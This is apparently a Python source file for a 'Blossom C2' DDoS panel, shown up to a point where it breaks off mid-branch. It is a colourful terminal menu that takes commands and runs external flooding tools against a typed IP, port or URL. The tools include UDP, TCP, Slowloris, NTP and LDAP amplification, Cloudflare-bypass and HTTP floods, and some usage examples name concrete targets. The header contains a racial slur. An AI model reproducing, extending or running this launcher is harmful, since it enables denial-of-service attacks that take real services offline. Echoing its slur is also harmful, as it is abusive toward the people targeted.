##############################
# Blossom Made by 🌸   #
# COPY = NIGGER              #
##############################

import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(f'''
     /🌸🌸/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  







    ''')
    time.sleep(0.6)
    clear()
    print(f'''



     /🌸🌸/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  


    ''')
    time.sleep(0.6)
    clear()
    print(f'''







     /🌸🌸/|        
     | == /        
      |  |                  

    ''')
    time.sleep(0.6)
    clear()
    print(f"""





            
 __________________________
    """)
    time.sleep(0.8)
    clear()

def si():
    print('         \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233m🌸 \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233m🌸Welcome to Blossom🌸! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: Blossom \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v1.2')
    print("")

def tools():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mTools     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mGEOIP               \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mREVERSE-DNS           \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mREVERSEIP           \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mASN-LOOKUP            \x1b[38;2;0;212;14m║  
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mSUBNET-LOOKUP       \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mDNS-LOOKUP            \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m                    \x1b[38;2;0;212;14m║                        \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m                    \x1b[38;2;0;212;14m║                        \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝
''')
    
def banners():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mBANNERS   \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mTROLL               \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mLEWD-V2               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mCHERRY              \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mSAILOR-MOON           \x1b[38;2;0;212;14m║  
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mAUBREY              \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mFEMBOY                \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mSALLY               \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mAYAN                  \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mLEWD-V1             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mTOGA                  \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝
''')

def rules():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mRules     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m. Do not attack .gov/.gob/.edu/.mil domains   \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m. Only attack stress testing servers          \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m. Feel Free to Modify!                        \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m. Hope you have a Blossomful Day              \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m. The creator does not do any harm            \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚═══════════════════════════════════════════════╝
''')

def ports():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mPorts     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m21 - \x1b[38;2;0;255;255mSFTP       \x1b[38;2;0;212;14m69   - \x1b[38;2;0;255;255mTFTP      \x1b[38;2;0;212;14m5060  - \x1b[38;2;0;255;255mRIP  \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m22 - \x1b[38;2;0;255;255mSSH        \x1b[38;2;0;212;14m80   - \x1b[38;2;0;255;255mHTTP     \x1b[38;2;0;212;14m30120 - \x1b[38;2;0;255;255mFIVEM \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m23 - \x1b[38;2;0;255;255mTELNET     \x1b[38;2;0;212;14m443  - \x1b[38;2;0;255;255mHTTPS                  \x1b[38;2;0;212;14m║   
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m25 - \x1b[38;2;0;255;255mSMTP       \x1b[38;2;0;212;14m3074 - \x1b[38;2;0;255;255mXBOX                   \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m53 - \x1b[38;2;0;255;255mDNS        \x1b[38;2;0;212;14m5060 - \x1b[38;2;0;255;255mPLAYSATION             \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m25 - \x1b[38;2;0;255;255mMINECRAFT  \x1b[38;2;0;212;14m25565 - \x1b[38;2;0;255;255mMINECRAFT             \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚═══════════════════════════════════════════════╝
''')

def special():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mSpecial    \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mSTRESS              \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m                      \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m                    \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m                      \x1b[38;2;0;212;14m║  
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m                    \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m                      \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m                    \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m                      \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m                    \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m                      \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝''')
    
def layer7():
    clear()
    si()
    print(f'''
                              \x1b[38;2;0;212;14m╔═══════════════╗
                              \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mLayer 7    \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mHTTP-RAW            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mCRASH             \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mHTTP-SOCKET         \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mHTTP-FLOOD        \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mHTTP-STORM          \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mCF-SOCKET         \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mHTTP-RAND           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mCF-PRO            \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mOVERFLOW            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mHYPER             \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mCF-BP               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mSLOW              \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mUAM-BP              \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mHTTPS-SPOOF       \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mOVH-RAW             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mOVH-BEAM          \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝
''')

def layer4():
    clear()
    si()
    print(f'''
                              \x1b[38;2;0;212;14m╔═══════════════╗
                              \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mLAYER 4    \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩════════════════╗
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mUDP                 \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mTCP                 \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mNFO-KILLER          \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mSTD                 \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mUDP-BP              \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mDESTORY             \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mHOME                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mGOD                 \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mSLOWLORIS           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mFLUX                \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mSTD-V2              \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m                    \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╚═══════════════════════╩═══════════════════════╝
''')

def amp_games():
    clear()
    si()
    print(f'''
                              \x1b[38;2;0;212;14m╔═══════════════╗
                              \x1b[38;2;0;212;14m║\x1b[38;2;0;255;255m AMP's \x1b[38;2;0;212;14m/ \x1b[38;2;0;255;255mGames \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mOVH-AMP             \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mOVH-AMP           \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mMINECRAFT           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mSTD               \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mSAMP                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mLDAP              \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m                    \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m                  \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝''')


def menu():
    sys.stdout.write(f"         \x1b]2;🌸Blossom C2🌸 --> Stars: [{bots}] | Online Users: [1] | Methods: [25] | Bypass: [10] | Amps: [1]")
    clear()
    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233m🌸Blossom🌸 \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to 🌸Blossom-C2🌸 \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: 🌸Blossom🌸 \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mUpdate v2.0')
    print("")
    print("""
                        \x1b[38;2;0;212;14m╔╗  \x1b[38;2;0;186;45m ╦   ╔═╗\x1b[38;2;0;150;88m  ╔═╗ \x1b[38;2;0;113;133m ╔═╗ \x1b[38;2;0;83;168m ╔═╗ \x1b[38;2;0;49;147m ╔╦╗
                        \x1b[38;2;0;212;14m╠╩╗ \x1b[38;2;0;186;45m ║   ║ ║\x1b[38;2;0;150;88m  ╚═╗ \x1b[38;2;0;113;133m ╚═╗ \x1b[38;2;0;83;168m ║ ║ \x1b[38;2;0;49;147m ║║║
                        \x1b[38;2;0;212;14m╚═╝ \x1b[38;2;0;186;45m ╩═╝ ╚═╝\x1b[38;2;0;150;88m  ╚═╝ \x1b[38;2;0;113;133m ╚═╝ \x1b[38;2;0;83;168m ╚═╝ \x1b[38;2;0;49;147m ╩ ╩
                \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗
                \x1b[38;2;0;212;14m║          \x1b[38;2;239;239;239mWelcome to Blossom C2 DDoS Panel    \x1b[38;2;0;49;147m║                                      
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;49;147m- - - - - - \x1b[38;2;239;239;239m                    \x1b[38;2;0;212;14m- - - - - - -\x1b[38;2;0;49;147m║
                \x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝
                    \x1b[38;2;0;212;14m╔═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╗
                    \x1b[38;2;0;212;14m║ \x1b[38;2;239;239;239m                                     \x1b[38;2;0;49;147m║
                    \x1b[38;2;0;212;14m╚═══════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════╝
                \x1b[38;2;0;212;14m╔═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╗
                \x1b[38;2;0;212;14m║   \x1b[38;2;239;239;239m   Type help to see the all commands.      \x1b[38;2;0;49;147m║
                \x1b[38;2;0;212;14m╚═══════════\x1b[38;2;0;186;45m════════\x1b[38;2;0;150;88m═══════\x1b[38;2;0;113;133m═════\x1b[38;2;0;83;168m═════\x1b[38;2;0;49;147m══════════╝
""")

def main():
    menu()
    while(True):
        cnc = input('''\x1b[38;2;0;212;14m╔══[root\x1b[38;2;0;186;45m@Blossom\x1b[38;2;0;150;88m\x1b[38;2;0;113;133m\x1b[38;2;0;49;147m]
\x1b[38;2;0;212;14m╚\x1b[38;2;0;186;45m═\x1b[38;2;0;150;88m═\x1b[38;2;0;113;133m═\x1b[38;2;0;83;168m═\x1b[38;2;0;49;147m➤ \x1b[38;2;239;239;239m''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            layer4()
        elif cnc == "amp" or cnc == "AMP" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME":
            amp_games()
        elif cnc == "special" or cnc == "SPECIAL" or cnc == "specials" or cnc == "SPECIALS" or cnc == "Specials":
            special()
        elif cnc == "rule" or cnc == "Rules" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            rules()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT" or cnc == "Ports":
            ports()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            tools()
        elif cnc == "banner" or cnc == "BANNER" or cnc == "banners" or cnc == "BANNERS" or cnc == "Banners":
            banners()

# 🌸LAYER 4 METHODS🌸   

        elif "UDP-BP" in cnc:
            try:
                IP = cnc.split()[1]
                Port = cnc.split()[2]
                os.system(f'./UDP-BP {IP} {Port}')
            except IndexError:
                print('Usage: UDP-BP <IP> <Port>')
                print('Example: UDP-BP 1.1.1.1 80')

        elif "STD-V2" in cnc:
            try:
                IP = cnc.split()[1]
                Port = cnc.split()[2]
                os.system(f'./STD-V2 {IP} {Port}')
            except IndexError:
                print('Usage: STD-V2 <IP> <Port>')
                print('Example: STD-V2 1.1.1.1 80')

        elif "FLUX" in cnc:
            try:
                IP = cnc.split()[1]
                Port = cnc.split()[2]
                Thread = cnc.split()[3]
                os.system(f'./FLUX {IP} {Port} {Thread} 0')
            except IndexError:
                print('Usage: FLUX <IP> <Port> <Threads>')
                print('Example: FLUX 1.1.1.1 80 250')

        elif "SLOWLORIS" in cnc:
            try:
                IP = cnc.split()[1]
                Port = cnc.split()[2]
                os.system(f'./SLOWLORIS {IP} {Port}')
            except IndexError:
                print('Usage: SLOWLORIS <IP> <Port>')
                print('Example: SLOWLORIS 1.1.1.1 80')

        elif "GOD" in cnc:
            try:
                IP = cnc.split()[1]
                Port = cnc.split()[2]
                Time = cnc.split()[3]
                os.system(f'perl GOD.pl {IP} {Port} 65500 {Time}')
            except IndexError:
                print('Usage: GOD <IP> <Port> <Time>')
                print('Example: GOD 1.1.1.1 80 60')

        elif "DESTROY" in cnc:
            try:
                IP = cnc.split()[1]
                Port = cnc.split()[2]
                Time = cnc.split()[3]
                os.system(f'perl DESTROY.pl {IP} {Port} 65500 {Time}')
            except IndexError:
                print('Usage: DESTROY <IP> <Port> <Time>')
                print('Example: DESTROY 1.1.1.1 80 60')

        elif "STD" in cnc:
            try:
                IP = cnc.split()[1]
                Port = cnc.split()[2]
                os.system(f'./STD-NOSPOOF {IP} {Port}')
            except IndexError:
                print('Usage: STD <IP> <Port>')
                print('Example: STD 1.1.1.1 80')

        elif "HOME" in cnc:
            try:
                IP = cnc.split()[1]
                Port = cnc.split()[2]
                PSize = cnc.split()[3]
                Time = cnc.split()[4]
                os.system(f'perl HOME.pl {IP} {Port} {PSize} {Time}')
            except IndexError:
                print('Usage: HOME <IP> <Port> <Packet_Size> <Time>')
                print('Example: HOME 1.1.1.1 80 65500 60')

        elif "UDP" in cnc:
            try:
                IP = cnc.split()[1]
                Port = cnc.split()[2]
                os.system(f'python3.11 UDP.py {IP} {Port} 0 0')
            except IndexError:
                print('Usage: UDP <IP> <Port>')
                print('Example: UDP 1.1.1.1 80')

        elif "NFO-KILLER" in cnc:
            try:
                IP = cnc.split()[1]
                Port = cnc.split()[2]
                Threads = cnc.split()[3]
                Time = cnc.split()[4]
                os.system(f'./NFO-KILLER {IP} {Port} {Threads} -1 {Time}')
            except IndexError:
                print('Usage: NFO-KILLER <IP> <Port> <Threads> <Time>')
                print('Example: NFO-KILLER 1.1.1.1 80 850 60')

        elif "OVH-RAW" in cnc:
            try:
                Method = cnc.split()[1]
                IP = cnc.split()[2]
                Port = cnc.split()[3]
                Time = cnc.split()[4]
                Conns = cnc.split()[5]
                os.system(f'./OVH-RAW {Method} {IP} {Port} {Time} {Conns}')
            except IndexError:
                print('Usage: OVH-RAW METHODS[GET/POST/HEAD] <IP> <Port> <Time> <Connections>')
                print('Example: OVH-RAW GET 1.1.1.1 80 60 8500')

        elif "TCP" in cnc:
            try:
                Method = cnc.split()[1]
                IP = cnc.split()[2]
                Port = cnc.split()[3]
                Time = cnc.split()[4]
                Conns = cnc.split()[5]
                os.system(f'./100UP-TCP {Method} {IP} {Port} {Time} {Conns}')
            except IndexError:
                print('Usage: TCP METHODS[GET/POST/HEAD] <IP> <Port> <Time> <Connections>')
                print('Example: TCP GET 1.1.1.1 80 60 8500')

# 🌸SPECIAL METHODS🌸

        elif "STRESS" in cnc:
            try:
                IP = cnc.split()[1]
                Port = cnc.split()[2]
                Mode = cnc.split()[3]
                Conn = cnc.split()[4]
                Time = cnc.split()[5]
                Out = cnc.split()[6]
                os.system(f'go run STRESS.go {IP} {Port} {Mode} {Conn} {Time} {Out}')
            except IndexError:
                print('Usage: STRESS <IP> <Port> <Mode> <Connection> <Seconds> <Timeout>')
                print('MODE: [1] TCP')
                print('      [2] UDP')
                print('      [3] HTTP')
                print('Example: STRESS 1.1.1.1 80 3 1250 60 5')
                
# 🌸AMP/GAMES METHODS🌸

        elif "SAMP" in cnc:
            try:
                IP = cnc.split()[1]
                Port = cnc.split()[2]
                os.system(f'python3.11 SAMP.py {IP} {Port}')
            except IndexError:
                print('Usage: SAMP <IP> <Port>')
                print('Example: SAMP 1.1.1.1 7777')

        elif "LDAP" in cnc:
            try:
                IP = cnc.split()[1]
                Port = cnc.split()[2]
                Thread = cnc.split()[3]
                Time = cnc.split()[4]
                os.system(f'./LDAP {IP} {Port} {Thread} -1 {Time}')
            except IndexError:
                print('Usage: LDAP <IP> <Port> <Threads> <Time>')
                print('Example: LDAP 1.1.1.1 80 650 60')

        elif "MINECRAFT" in cnc:
            try:
                IP = cnc.split()[1]
                Throttle = cnc.split()[2]
                Threads = cnc.split()[3]
                Time = cnc.split()[4]
                os.system(f'./MINECRAFT-SLAM {IP} {Threads} {Time}')
            except IndexError:
                print('Usage: MINECRAFT <IP> <Throttle> <Threads> <Time>')
                print('Example: MINECRAFT 1.1.1.1 5000 500 60')

        elif "OVH-AMP" in cnc:
            try:
                IP = cnc.split()[1]
                Port = cnc.split()[2]
                os.system(f'./OVH-AMP {IP} {Port}')
            except IndexError:
                print('Usage: OVH-AMP <IP> <Port>')
                print('Example: OVH-AMP 1.1.1.1 80')
                
        elif "NTP" in cnc:
            try:
                IP = cnc.split()[1]
                Port = cnc.split()[2]
                Throttle = cnc.split()[3]
                Time = cnc.split()[4]
                os.system(f'./NTP {IP} {Port} NTP.txt {Throttle} {Time}')
            except IndexError:
                print('Usage: NTP <IP> <Port> <Throttle> <Time>')
                print('Example: NTP 1.1.1.1 22 250 60')

# 🌸 LAYER 7 METHODS 🌸
 
        elif "OVH-BEAM" in cnc:
            try:
                Method = cnc.split()[1]
                IP = cnc.split()[2]
                Port = cnc.split()[3]
                Time = cnc.split()[4] 
                os.system(f'./OVH-BEAM {Method} {IP} {Port} {Time} 1024')
            except IndexError:
                print('Usage: OVH-BEAM <GET/HEAD/POST/PUT> <IP> <Port> <Time>')
                print('Example: OVH-BEAM GET 51.38.92.223 80 60')
    
        elif "HTTPS-SPOOF" in cnc:
            try:
                URL = cnc.split()[1]
                Time = cnc.split()[2]
                Thread = cnc.split()[3]
                os.system(f'python3.11 HTTPS-SPOOF.py {URL} {Time} {Thread}')
            except IndexError:
                print('Usage: HTTPS-SPOOF <URL> <Time> <Threads>')
                print('Example: HTTPS-SPOOF http://vailon.com 60 500')
    
        elif "SLOW" in cnc:
            try:
                URL = cnc.split()[1]
                Time = cnc.split()[2]
                os.system(f'node SLOW.js {URL} {Time}')
            except IndexError:
                print('Usage: SLOW <URL> <Time>')
                print('Example: SLOW http://vailon.com 60')
    
        elif "HYPER" in cnc:
            try:
                URL = cnc.split()[1]
                Time = cnc.split()[2]
                os.system(f'node HYPER.js {URL} {Time}')
            except IndexError:
                print('Usage: HYPER <URL> <Time>')
                print('Example: HYPER http://vailon.com 60')
                
        elif "CF-SOCKET" in cnc:
            try:
                os.system(f'python3.11 BYPASS.py')
            except IndexError:
               print('Usage: CF-SOCKET <URL> <PORT> <THREADS>')
               print('Example: CF-SOCKET http://example.com 80 500')
    			
        elif "CF-PRO" in cnc:
            try:
                os.system(f'python3.11 CF-PRO.py')
            except IndexError:
                print('CF-PRO')
        elif "cf-socket" in cnc:
            try:
                os.system(f'python3.11 BYPASS.py')
            except IndexError:
                print('CF-SOCKET')
        
        elif "HTTP-SOCKET" in cnc:
            try:
                URL = cnc.split()[1]
                Per = cnc.split()[2]
                Time = cnc.split()[3]
                os.system(f'node HTTP-SOCKET {URL} {Per} {Time}')
            except IndexError:
                print('Usage: HTTP-SOCKET <URL> <Per> <Time>')
                print('Example: HTTP-SOCKET http://example.com 5000 60')

        elif "HTTP-RAW" in cnc:
            try:
                URL = cnc.split()[1]
                Time = cnc.split()[2]
                os.system(f'node HTTP-RAW {URL} {Time}')
            except IndexError:
                print('Usage: HTTP-RAW <URL> <Time>')
                print('Example: HTTP-RAW http://example.com 60')

        elif "HTTP-REQUESTS" in cnc:
            try:
                URL = cnc.split()[1]
                Time = cnc.split()[2]
                os.system(f'node HTTP-REQUESTS {URL} {Time}')
            except IndexError:
                print('Usage: HTTP-REQUESTS <URL> <Time>')
                print('Example: HTTP-REQUESTS http://example.org 60')

        elif "HTTP-RAND" in cnc:
            try:
                URL = cnc.split()[1]
                Time = cnc.split()[2]
                os.system(f'node HTTP-RAND.js {URL} {Time}')
            except IndexError:
                print('Usage: HTTP-RAND <URL> <Time>')
                print('Example: HTTP-RAND http://vailon.com/ 60')

        elif "OVERFLOW" in cnc:
            try:
                IP = cnc.split()[1]
                Port = cnc.split()[2]
                Thread = cnc.split()[3]
                os.system(f'./OVERFLOW {IP} {Port} {Thread}')
            except IndexError:
                print('Usage: OVERFLOW <IP> <Port> <Threads>')
                print('Example: OVERFLOW 1.1.1.1 80 5000')

        elif "CF-BP" in cnc:
            try:
                URL = cnc.split()[1]
                Time = cnc.split()[2]
                Thread = cnc.split()[3]
                os.system(f'python3.11 bypass.py {URL} {Time} {Thread}')
            except IndexError:
                print('Usage: CF-BP <URL> <Time> <Threads>')
                print('Example: CF-BP http://example.com 60 1250')

        elif "CF-SOCKET" in cnc:
            try:
                URL = cnc.split()[1]
                Time = cnc.split()[2]
                Thread = cnc.split()[3]
                os.system(f'node CF.js {URL} {Time} {Thread}')
            except IndexError:
                print('Usage: CF-SOCKET <URL> <Time> <Threads>')
                print('Example: CF-SOCKET http://example.com 60 1250')

        elif "UAM-BP" in cnc:
            try:
                URL = cnc.split()[1]
                Time = cnc.split()[2]
                Per = cnc.split()[3]
                os.system(f'node UAM-BP.js {URL} {Time} {Per} HTTP.txt')
            except IndexError:
                print('Usage: UAM-BP <URL> <Time> <Req_Per_IP>')
                print('Example: UAM-BP http://example.com 60 1250')

        elif "CRASH" in cnc:
            try:
                URL = cnc.split()[1]
                Method = cnc.split()[2]
                os.system(f'go run HULK.go -site {URL} -data {Method}')
            except IndexError:
                print('Usage: CRASH <URL> METHODS<GET/POST>')
                print('Example: CRASH http://example.com GET')

        elif "HTTP-FLOOD" in cnc:
            try:
                URL = cnc.split()[1]
                Thread = cnc.split()[2]
                Method = cnc.split()[3]
                Time = cnc.split()[4]
                os.system(f'go run HTTP-FLOOD.go {URL} {Thread} {Method} {Time} nil')
            except IndexError:
                print('Usage: HTTP-FLOOD <URL> <Threads> METHODS<GET/POST> <Time>')
                print('Example: HTTP-FLOOD http://example.com 15000 get 60')

        elif "HTTP-GET" in cnc:
            try:
                URL = cnc.split()[1]
                os.system(f'./HTTP-GET {URL} 10000 50 100')
            except IndexError:
                print('Usage: HTTP-GET <URL>')
                print('Example: HTTP-GET http://example.com')

# 🌸BANNERS🌸

        elif "TROLL" in cnc:
                print('░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░   ')
                print('░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░  ')
                print('░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░  ')
                print('░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░  ')
                print('░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░  ')
                print('█░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█  ')
                print('█░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█  ')
                print('░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░  ')
                print('░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░  ')
                print('░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░  ')
                print('░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░  ')
                print('░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░  ')
                print('░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░  ')
                print('░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░  ')
                print('░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░  ')

        elif "CHERRY" in cnc:
